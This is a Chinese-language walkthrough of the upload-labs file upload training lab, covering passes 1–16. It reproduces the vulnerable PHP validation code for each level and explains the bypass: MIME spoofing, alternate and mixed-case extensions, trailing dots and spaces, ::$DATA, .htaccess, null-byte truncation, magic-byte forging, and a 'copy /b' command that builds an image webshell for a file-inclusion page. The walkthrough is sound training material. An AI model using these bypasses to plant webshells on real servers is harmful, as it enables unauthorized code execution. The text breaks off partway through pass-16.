# pass-1
## 代码分析

function checkFile() {
    //获取上传文件的名字
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型，白名单
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
## 解题方法
本关定义了允许上传的文件类型白名单，通过前端对上传的文件进行检查，有两种方法绕过验证上传php文件

### 禁用JavaScript
F12打开开发者工具→设置→禁用JavaScript，上传一句话木马文件，使用蚁剑连接

### burp suite抓包
修改文件后缀为jpg→上传文件并使用burp suite抓包→在bp中修改文件后缀为php，即可上传成功

# pass-2

## 代码分析

$is_upload = false;
//提示代码
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
### 关键函数
$_FILES['upload_file']['type'] == 'image/jpeg'  

作用：

通过检测content-type判断上传文件内容

- content-type：通常是 HTTP 协议中用于标识消息主体内容类型的头部字段。在文件上传场景里，当客户端（如浏览器）向服务器发送文件时，会在请求头中包含 content-type 字段，用来告知服务器所发送内容的类型。不过在 PHP 中处理文件上传时，$_FILES['upload_file']['type'] 本质上是客户端在上传文件时提供的 MIME 类型信息，虽然和 content-type 有一定关联，但它并非直接的 content-type 字段。

$_FILES 超全局变量

在 PHP 里，当通过 HTML 表单上传文件时，上传的文件信息会被存储在 $_FILES 这个超全局变量中。$_FILES 是一个二维数组，其键名是 HTML 表单中 input 元素的 name 属性值。例如，若 HTML 表单中有一个 input 元素的 name 属性值为 upload_file，那么上传文件的相关信息就会存储在 $_FILES['upload_file'] 中。

$_FILES['upload_file']['type']

表示上传文件的 MIME 类型。

MIME（Multipurpose Internet Mail Extensions）类型是一种标准，用于表示文档、文件或字节流的性质和格式。在文件上传的场景中，它可以帮助我们识别上传文件的具体类型，比如图片、文本、音频等。

条件判断的意义

($_FILES['upload_file']['type'] == 'image/jpeg') 这个条件判断会检查上传文件的 MIME 类型是否为 image/jpeg，也就是判断上传的文件是否为 JPEG 格式的图像。如果是，则条件成立，返回 true；如果不是，则条件不成立，返回 false。

## 解题方法
本题是通过检测上传文件的MIME内容判断文件类型，可以通过修改文件的content-type绕过。

上传一句话木马的php文件→burp suite抓包，修改content-type:image/jpeg实现绕过

或是同第一关上传jpg文件，抓包修改文件后缀为php

# pass-3

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        //黑名单
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

### 关键函数

trim()

用于去除字符串首尾的空白字符。

在代码中，trim($_FILES['upload_file']['name']) 用于去除上传文件名首尾的空白字符。

strrchr()

用于查找字符串中最后一次出现某个字符的位置，并返回从该位置到字符串末尾的所有字符。

在代码中，strrchr($file_name, '.') 用于获取上传文件的扩展名。

strtolower()

用于将字符串转换为小写。代码中使用它将文件扩展名转换为小写，以便进行不区分大小写的比较。

str_ireplace()

用于在字符串中进行不区分大小写的替换操作。

在代码中，str_ireplace('::$DATA', '', $file_ext) 用于去除文件扩展名中的 ::$DATA 字符串，这是为了防止 Windows 系统下的 NTFS 流攻击。

## 解题方法
本题设置黑名单，过滤了.asp、.aspx、.php、.jsp文件，但是没有过滤php3 php5 phtml等文件类型，可以通过上传此类文件绕过过滤

此处需要修改服务器配置文件，以小皮面板为例：

设置→配置文件→httpd。conf→apache→修改语句#AddType application/x-httpd-php .php .phtml为AddType application/x-httpd-php .php .php3 .phtml→重启服务器

修改成功后上传php文件，抓包修改后缀为php3即可上传成功

# pass-4

## 代码分析


$is_upload = false;
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

## 扩展知识

.htaccess

● 作用：分布式配置文件，一般用于url重写、认证、控制访问等

● 作用范围：特定目录（一般是网站根目录），及其子目录

● 优先级：较高，可覆盖apache的主要配置文件（httpd-conf）

● 生效方式：修改后立刻生效

httpd-conf

● 作用：包含apache·HTTP服务器的全局行为和默认设置

● 作用范围：整个服务器

● 优先级：较低

● 生效方式：管理员权限，重启服务器后生效

Apache服务器中 AllowOverride 指令用于指定 .htaccess 文件可以覆盖哪些服务器配置。它的取值决定了用户通过 .htaccess 文件对服务器设置的控制程度。

AllowOverride 的常用值说明如下：

None：这是最严格的设置。当设置为 None 时，服务器将完全忽略并不允许 .htaccess 文件覆盖任何配置选项。这通常是为了提升性能和安全性。

All：这是最宽松的设置。当设置为 All 时，服务器允许 .htaccess 文件覆盖所有配置选项。这给予了目录最大的灵活性，但也需要更高的安全关注。

AuthConfig：此选项允许 .htaccess 文件覆盖与身份验证（Authorization） 相关的配置选项。常用的指令包括 AuthType、AuthName、AuthUserFile 等，常用于设置目录的密码保护。

FileInfo：此选项允许 .htaccess 文件覆盖与文件和文档类型 相关的配置选项。常用的指令包括 DirectoryIndex（默认首页）、DefaultType（默认MIME类型）、ErrorDocument（自定义错误页面）等。

Indexes：此选项允许 .htaccess 文件覆盖与目录索引（Indexing） 相关的配置选项。常用的指令包括 Options（用于启用或禁用目录列表等功能）、IndexOptions、IndexIgnore 等，这些指令控制着当目录中没有默认文件时，如何向访问者显示文件列表。

Limit：此选项允许 .htaccess 文件覆盖与访问控制（Access Control） 相关的配置选项，例如 Require 指令，可以基于IP地址、用户等因素来限制对目录的访问。

Options：此选项允许 .htaccess 文件覆盖与目录特性（Options） 相关的配置选项，主要是指 Options 指令本身，用于启用或禁用特定的目录功能，例如是否允许执行CGI脚本、是否支持服务器端包含（SSI）等。

## 解题方法

### 方法一

在配置文件httpd-conf中修改AllowOverride none为AllowOverride ALL，创建一个.htaccess文件，内容为AddType application/x-httpd-php .jpg .txt（将txt文件与jpg文件当作php文件解析）

接着将木马文件后缀修改为jpg并上传，即可成功连接

### 方法二

分析代码功能

获取上传文件的文件名

$file_name = trim($_FILES['upload_file']['name']);

删除文件末尾的点

$file_name = deldot($file_name);

获取文件最后一个点后的内容，即文件后缀

$file_ext = strrchr($file_name, '.');

将文件后缀转换为小写

$file_ext = strtolower($file_ext);

去除字符串::$DATA

$file_ext = str_ireplace('::$DATA', '', $file_ext);

去除空格

$file_ext = trim($file_ext);

随后通过if语句判断经过以上处理的后缀名是否在黑名单内

可以在上传文件后使用burp suite抓包修改文件后缀为php. .，这样经过处理后（去除末尾的点，去空）的文件后缀名为php. ，不会被黑名单过滤，而Windows系统会自动去除文件末尾的点，达到上传php文件的效果

> linux不会自动去空，所以此方法在Linux环境下不可用

# pass-5

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

观察代码发现缺少语句$file_ext = strtolower($file_ext); //转换为小写 ，并且黑名单中过滤不完全

## 解题方法

上传一句话木马php文件，抓包修改文件后缀为Php即可成功上传

# pass-6

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

分析代码发现缺少语句$file_ext = trim($file_ext); //首尾去空 ，

## 解题方法

可以上传php文件，使用burp suite抓包，在文件后添加空格，是后缀变为php 绕过黑名单过滤。Windows系统和Linux系统对文件后缀空格会自动去空，所以php 文件上传后能被正常执行

# pass-7

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

缺少语句$file_name = deldot($file_name);//删除文件名末尾的点

## 解题方法

上传php文件，burp suite抓包修改后缀名为.php.绕过黑名单过滤。Windows系统会自动去除文件末尾的点，将文件还原为.php文件，使得PHP代码能被正常执行

# pass-8

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

缺少语句$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 

## 扩展知识

**额外数据流**

在 Windows 操作系统中，如果你在文件名后看到 ::$DATA 的标识，这表示你正在查看该文件的一个 附加数据流。这是 NTFS 文件系统提供的一种特殊数据存储机制。

例如，1.txt是一个文件，1.txt::$DATA就是这个文件的一个附加数据流

1、什么是额外数据流？

如果将文件想象成一个容器，在大多数文件系统中，容器只有一个主隔间，里面存放着文件的实际内容。而 NTFS 文件系统允许这个容器拥有多个隔间，这些额外的“隔间”就是附加数据流。

- 默认数据流：我们平常通过文件名（如 document.txt）访问的就是这个主隔间，它的完整名称实际上是 document.txt::$DATA。

- 附加数据流：你可以创建其他命名的隔间，例如 document.txt:secret_stream:$DATA，用于存储与主文件相关的额外信息。

2. ::$DATA 的作用是什么？

附加数据流通常用于存储不会影响文件主要内容的元外信息，例如：

- 文件的元数据（如作者、标题等属性）。

- 备份信息。

- 安全标签或来源信息。

- 在某些情况下，也被软件（如 iTunes）用来存储特定数据。


3. 如何访问和使用？

对于普通用户和大多数常规文件操作工具（如 Windows 记事本、基础的文件管理器）来说，它们只能感知和操作文件的默认数据流，会自动忽略附加数据流。

要创建、查看或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口。

示例，在命令提示符中使用 echo :-D > test.txt:helli.txt 可以创建一个附加数据流，使用 notepad test.txt:hello.txt 可以查看它。

## 过滤方法

本题不去除::$DATA，可以上传php文件后抓包修改后缀为.php::$DATA，验证时不匹配黑名单绕过过滤，成功上传后，系统则根据NTFS规则，自动忽略文件后的::$DATA，将其解释为php文件

注意连接时要删去::$DATA后缀

# pass-9

## 代码分析

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

## 解题方法

抓包在文件后添加. . 

# pass-10

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

## 关键函数

$file_name = str_ireplace($deny_ext,"", $file_name);

过滤黑名单中的后缀名，将匹配到的内容替换为空，但是只执行一次

## 解题方法

双写绕过

抓包修改后缀为.pphphp，中间的php会被识别过滤，剩下的p与hp又组成了.php后缀，是文件得以正常执行

注意系统识别是从左往右扫描，所以只能写成.pphphp

如果写成.phphpp则会被去掉前面的php，导致后缀变成.hpp

# pass-11

## 代码分析

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');//白名单过滤
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);//获取.之后的内容，即文件后缀
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name']; //暂时文件路径
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;//真实文件路径

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！"; //从临时路径移动到真实路径
    }//如果后缀在白名单返回true，否则返回else，



## 关键函数

$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

$_GET['save_path']通过get请求从url参数中获取文件保存路径，并且未作任何过滤

此条语句：get获取文件路径/随机数.后缀名

## 扩展知识

**%00空字节截断**

0x00（编程语言），%00（url编码）会被解析为空字节

在 C/C++、PHP 等语言中，空字符表示字符串的结束。检测到空字节后会忽略后面的内容



## 解题方法

上传一句话木马的jpg文件通过白名单，抓包修改get参数，将?save_path=../upload/ 改为?save_path=../upload/shell.php%00

这样，系统拼接出的文件路径就是../upload/shell.php%00/随机数.jpg。%00在url中会被识别为空字节，能够截断后面的内容，最终文件被保存为upload文件夹下的shell.php文件

注意连接时需要去掉url最后随机数.jpg部分

# pass-12

## 代码分析

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

## 关键函数

$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

同上题一样，只是修改为post提交

最大的区别在于，get方式下，%00在url下会被自动解码为空字节，但在post提交中不会被自动解码

## 解题方法

同上题，上传一句话木马的jpg文件，抓包修改post请求体中的save_path参数为../upload/shell.php

插入空字节的步骤是：

在php的后面输入一个空格，选中此空格，在右边inspector的code栏中修改hex编码为00，应用变更，以此方法插入空字节

接着同上方法连接

# pass-13

## 代码分析

function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}

通过获取前两个字节的内容来确定文件的类型

## 关键函数

getReailFileType() 

是一个用于检测文件类型的函数，通过读取文件的前两个字节（即文件头信息）判断文件类型。该方法常见于文件上传漏洞的靶场练习或代码审计场景，主要用于绕过前端文件类型限制。

## 扩展知识

### 图片文件头

文件头（Magic Number）是位于文件开头的一串特定字节序列，用于标识文件的格式。以下是一些常见图片格式的文件头特征：

JPEG/JFIF (最常见的照片格式)：

- 文件头：FF D8

- 文件尾：FF D9 (JPEG End of Image标记)

PNG (无损压缩格式)：

- 文件头：89 50 4E 47 0D 0A 1A 0A

其中前两个字节为 89 50

GIF (支持动画的图像格式)：

- 文件头：47 49 46 38 (对应ASCII字符 "GIF8")

其中前两个字节为 47 49

BMP (Windows 位图格式)：

- 文件头：42 4D (对应ASCII字符 "BM")

其中前两个字节为 42 4D

TIFF (标签图像文件格式)：

- 文件头：可以是 49 49 2A 00 (小端序) 或 4D 4D 00 2A (大端序)

前两个字节不固定，取决于字节序。

**修改文件头：**

在vscode中添加hex editor扩展，打开文件后右键文件名，点击重新打开编辑器的方式，选择十六进制编辑器

接着就可以修改文件头了

### 文件包含

本题有文件包含漏洞，在../upload-labs/include.php。

代码：

 <?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header("Content-Type:text/html;charset=utf-8");
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?> 

此页面在不经过检查的情况下将用户通过url参数file传递过来的文件路径用include函数包含并执行了，上传包含php代码的任何文件都能被都武器当作php脚本执行。

**文件包含漏洞的路径利用方式：**

1、相对路径遍历：通过../跨越目录

同级目录下的文件：?file=./file.txt 

上级目录下的文件：?file=../file.txt

2、绝对路径指定：直接使用根目录开始的完整路径

Linux：?file=/var/www/html/secret/config.php

Windows：?file=C:\xampp\htdocs\upload\shell.jpg

## 解题方法

使用hex editor修改文件编码绕过过滤

或是制作图片马：

使用命令 copy /b 1.jpg + shell.php hack.jpg 将正常的图片 1.jpg 与 Webshell 文件 shell.php 合并，生成包含恶意代码的图片马 hack.jpg

hack.jpg即为包含一句话木马代码的图片文件。将 hack.jpg 上传至服务器。由于服务器只进行图片格式校验，该文件会成功保存在上传目录（如 upload/）中。

访问文件包含漏洞页面，在url中只当图片马路径输入参数?file=./upload/图片码保存文件名

再用蚁剑连接

# pass-14

## 代码分析
<?php
// 定义一个函数，用于判断一个文件是否是真实的图片
function isImage($filename){
    // 定义允许的图片后缀类型列表
    $types = '.jpeg|.png|.gif';
    
    // 首先检查文件是否存在
    if(file_exists($filename)){
        // 使用getimagesize函数获取图片信息。如果是真实图片，返回数组；如果不是，返回false。
        $info = getimagesize($filename);
        
        // 利用getimagesize返回的图片类型常量，将其转换为对应的文件扩展名（如：2 -> '.jpg'）
        $ext = image_type_to_extension($info[2]);
        
        // 检查转换得到的扩展名$ext，是否存在于允许的类型列表$types中
        // stripos()用于查找字符串，返回位置，如果找不到则返回false。这里判断结果是否大于等于0，意味着只要找到了就通过。
        if(stripos($types,$ext)>=0){
            // 如果是允许的图片类型，返回该文件的扩展名
            return $ext;
        }else{
            // 如果不是允许的图片类型，返回false
            return false;
        }
    }else{
        // 如果文件根本不存在，返回false
        return false;
    }
}

// 初始化上传状态和消息变量
$is_upload = false;
$msg = null;

// 判断用户是否点击了提交按钮
if(isset($_POST['submit'])){
    // 获取用户上传文件在服务器上的临时路径
    $temp_file = $_FILES['upload_file']['tmp_name'];
    
    // 调用isImage函数验证临时文件是否为真实图片
    // 如果验证通过，$res是图片的扩展名（如 '.jpg'）；如果失败，$res是false
    $res = isImage($temp_file);
    
    // 判断验证是否失败
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        // 验证成功，开始组装文件在服务器上的永久保存路径
        // UPLOAD_PATH是一个常量，指向上传目录。后面拼接一个随机数、当前日期时间和通过验证的扩展名，生成唯一的新文件名。
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        
        // 将临时文件移动到永久路径
        if(move_uploaded_file($temp_file,$img_path)){
            // 移动成功，标记上传状态为true
            $is_upload = true;
        } else {
            // 移动失败，设置错误信息
            $msg = "上传出错！";
        }
    }
}
?>

## 关键函数

getimagesize() 

是 PHP 中一个用于获取图片基本信息的函数。如果成功读取到图片信息，它将返回一个数组，其中包含索引信息：

索引 0：图像的宽度，以像素为单位。

索引 1：图像的高度，以像素为单位。

索引 2：一个数字常量，用于标识图像的具体类型（比如是JPEG还是PNG），即IMAGETYPE_XXX 常量。

索引 3：一个可以直接用在 HTML <img> 标签里的字符串，例如 width="100" height="200"。

如果失败（例如文件不是图片或已损坏），则返回 false。

**图片类型常量：**

为了清晰判断图像类型，PHP 预定义了一系列常量，它们本质上对应着 getimagesize() 返回数组中索引 2 的那些数字。这些常量使得代码更易读和维护。

IMAGETYPE_GIF：对应 GIF 格式的图像。

IMAGETYPE_JPEG：对应 JPEG 或 JPG 格式的图像。

IMAGETYPE_PNG：对应 PNG 格式的图像。

IMAGETYPE_BMP：对应 BMP 格式的图像。

IMAGETYPE_PSD：对应 Adobe Photoshop 的 PSD 源文件格式。

## 解题方法

同上题生成图片马，上传后利用文件包含漏洞

# pass-15

## 代码分析

function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}

## 关键函数

exif_imagetype() 

PHP 中用于检测图像文件类型的函数，通过分析文件头部字节确定格式。

该函数接收一个文件名作为参数，返回对应的图像类型常量或 FALSE。若无法识别文件类型，会触发 E_NOTICE 警告并返回 FALSE

## 解题方法

同上题，上传图片马，利用文件包含漏洞

# pass-16

$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
